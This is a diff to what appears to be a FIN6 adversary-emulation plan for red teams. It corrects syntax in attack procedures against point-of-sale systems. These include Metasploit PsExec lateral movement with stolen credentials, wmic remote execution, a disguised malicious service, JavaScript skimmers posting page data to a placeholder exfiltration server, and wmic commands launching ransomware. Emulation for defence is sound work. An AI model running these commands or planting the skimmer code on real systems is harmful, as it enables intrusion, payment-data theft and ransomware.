@@ -38,13 +38,12 @@ Metasploit PsExec - PowerShell (T1059.001, T1569.002)
 
 ```sh
 msf> use exploit/windows/smb/psexec
-msf exploit(psexec) > set TARGET PowerShell
+msf exploit(psexec) > set Target PowerShell
+msf exploit(psexec) > set RHost #{PoS system}
 msf exploit(psexec) > set SMBDomain #{Domain}
-msf exploit(psexec) > set rhost #{PoS system}
-msf exploit(psexec) > set rport #{Port}
 msf exploit(psexec) > set SMBPass #{Password}
 msf exploit(psexec) > set SMBUser #{User}
-msf exploit(psexec) > exploit -j
+msf exploit(psexec) > exploit
 ```
 
 CobaltStrike PowerShell PsExec (T1059.001, T1569.002)
@@ -72,7 +71,7 @@ meterpreter>upload #{Assistant32.exe} C:\Windows\temp
 ##### FIN6 Procedure
 
 ```sh
-wmic /node:"{PoS system}" process call create #{"executable"}
+wmic /node:#{"PoS system"} process call create #{"executable"}
 ```
 
 ```sh
@@ -122,7 +121,7 @@ Service Creation (T1543.003)
 ##### FIN6 Procedure
 
 ```sh
-sc qc Windows Help Assistant binpath="c:\windows\temp\Assistant32.exe" start="auto" obj="LocalSystem"
+sc create "Windows Help Assistant" binpath="c:\windows\temp\Assistant32.exe" start="auto" obj="LocalSystem"
 ```
 
 #### 5.5 - PoS data exfiltration over DNS tunnel (T1048.003) <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup>
@@ -163,10 +162,9 @@ Metasploit PsExec - PowerShell (T1059.001, T1569.002)
 
 ```sh
 msf> use exploit/windows/smb/psexec
-msf exploit(psexec) > set TARGET PowerShell
+msf exploit(psexec) > set Target PowerShell
+msf exploit(psexec) > set RHost #{PoS system}
 msf exploit(psexec) > set SMBDomain #{Domain}
-msf exploit(psexec) > set rhost #{PoS system}
-msf exploit(psexec) > set rport #{Port}
 msf exploit(psexec) > set SMBPass #{Password}
 msf exploit(psexec) > set SMBUser #{User}
 msf exploit(psexec) > exploit -j
@@ -208,7 +206,7 @@ window.onload = function() {
             jQuery.ajax({
                 type: "POST",
                 async: !0,
-                url:"#{MaliciousExfilServer.com}",
+                url: #{"MaliciousExfilServer.com"},
                 data: t,
                 dataType: "application/json"
             })
@@ -230,7 +228,7 @@ window.onload = function(){
             JQuery.ajax({
                 type: "POST",
                 async: true,
-                url: "#{MaliciousExfilServer.com}",
+                url: #{"MaliciousExfilServer.com"},
                 data: pdati,
                 dataType: 'application/json'
             });
@@ -321,7 +319,7 @@ Kill Script
 ##### FIN6 Procedure
 
 ```sh
-wmic /node:#{Ransomware recipient} /user:#{"domain\username"} /password:#{"password" } process call create "cmd /c c:\windows\temp\windows.bat" or "kill.bat"
+wmic /node:#{Ransomware recipient} /user:#{"domain\username"} /password:#{"password"} process call create "cmd /c c:\windows\temp\windows.bat" or "kill.bat"
 ```
 
 Ransomware
@@ -329,7 +327,7 @@ Ransomware
 ##### FIN6 Procedure
 
 ```sh
-wmic /node:#{Ransomware recipient} /user:#{"domain\username"} /password:#{"password" } process call create "cmd /c c:\windows\temp\sss.exe"
+wmic /node:#{Ransomware recipient} /user:#{"domain\username"} /password:#{"password"} process call create "cmd /c c:\windows\temp\sss.exe"
 ```
 
 #### PsExec
